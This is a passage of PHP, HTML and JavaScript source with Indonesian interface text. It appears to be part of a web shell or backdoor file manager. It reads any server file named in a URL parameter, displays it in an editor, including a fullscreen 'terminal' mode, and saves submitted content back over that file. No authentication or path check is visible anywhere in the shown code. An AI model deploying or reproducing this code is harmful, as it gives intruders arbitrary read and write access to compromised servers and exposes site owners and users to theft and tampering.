    function submitEdit(e) {
        e.preventDefault();
        const content = document.getElementById('editArea').value;
        const file = document.getElementById('targetFile').value;
        fetch('', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'save_edit=1&target_file=' + encodeURIComponent(file) + '&new_content=' + encodeURIComponent(
                content)
        }).then(r => r.text()).then(txt => {
            if (txt.trim() === 'OK') {
                // show success then close
                document.getElementById('editStatus').innerText = '✔ File disimpan.';
                setTimeout(() => closeModal(), 800);
            } else {
                document.getElementById('editStatus').innerText = txt;
            }
        });
    }

    // Terminal page handling - open in new window (ke mode terminal)
    </script>

</body>

</html>

<?php
                        // -------------------- Inline edit page (terminal fullscreen) --------------------
                        if (isset($_GET['edit']) && is_file($_GET['edit']) && isset($_GET['terminal'])) {
                            $file = $_GET['edit'];
                            $content = @file_get_contents($file);
                            // minimal full-screen editor (green on black style)
                            ?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Edit: <?= htmlspecialchars(basename($file)) ?></title>
    <style>
    body {
        margin: 0;
        background: #0b0f0b;
        color: #aaffaa;
        font-family: monospace
    }

    .bar {
        background: #030704;
        padding: 12px;
        display: flex;
        justify-content: space-between;
        align-items: center
    }

    textarea {
        width: 100vw;
        height: calc(100vh - 64px);
        background: #041004;
        color: #aaffaa;
        border: none;
        padding: 12px;
        font-family: monospace;
        font-size: 14px;
        outline: none
    }

    button {
        padding: 8px 12px;
        border-radius: 6px;
        border: none;
        background: #00bfff;
        color: #001;
        cursor: pointer
    }
    </style>
</head>

<body>
    <div class="bar">
        <div>📝 <?= htmlspecialchars($file) ?></div>
        <div>
            <button onclick="saveFile()">💾 Save (Ctrl+S)</button>
            <button onclick="window.location='<?= htmlspecialchars($_SERVER['HTTP_REFERER'] ?? '?') ?>'">🗙
                Cancel</button>
            <span id="status" style="margin-left:12px;color:#9fd;"></span>
        </div>
    </div>
    <textarea id="editor"><?= htmlspecialchars($content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></textarea>
    <script>
    function saveFile() {
        const editor = document.getElementById('editor');
        const status = document.getElementById('status');
        status.innerText = 'Saving...';
        fetch(window.location.pathname + window.location.search, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'save_edit=1&target_file=' + encodeURIComponent('<?= addslashes($file) ?>') +
                '&new_content=' + encodeURIComponent(editor.value)
        }).then(r => r.text()).then(resp => {
            if (resp.trim() === 'OK') {
                status.innerText = '✔ Saved!';
            } else {
                status.innerText = '🗙 ' + resp;
            }
            setTimeout(() => status.innerText = '', 1500);
        }).catch(() => {
            status.innerText = '🗙 Error!';
        });
    }
    document.addEventListener('keydown', function(e) {
        if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 's') {
            e.preventDefault();
            saveFile();
        }
    });
    </script>
</body>

</html>
<?php
                            exit;
                        }
                        
                        if (isset($_GET['edit']) && is_file($_GET['edit']) && (isset($_GET['ajax']) || isset($_GET['plain']))) {
                            $file = $_GET['edit'];
                            $content = @file_get_contents($file);
                            echo "<h3 style='color:#fff'>Edit File: " . htmlspecialchars($file) . "</h3>
    <form method='post' onsubmit='submitEdit(event)'>
      <textarea id='editArea' class='textarea' style='background:#041018;color:#dff7ff'>".htmlspecialchars($content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')."</textarea>
      <input type='hidden' id='targetFile' value='" . htmlspecialchars($file) . "'>
      <div style='margin-top:8px;display:flex;gap:8px;justify-content:flex-end;'>
        <button type='submit' class='btn btnAccent'>Simpan</button>
        <button type='button' class='btn' onclick='closeModal()'>Batal</button>
      </div>
      <div id='editStatus' style='margin-top:8px;color:#9aa4ad'></div>
    </form>";
                            if (isset($_GET['plain'])) exit;
                        }
                        
                        ?>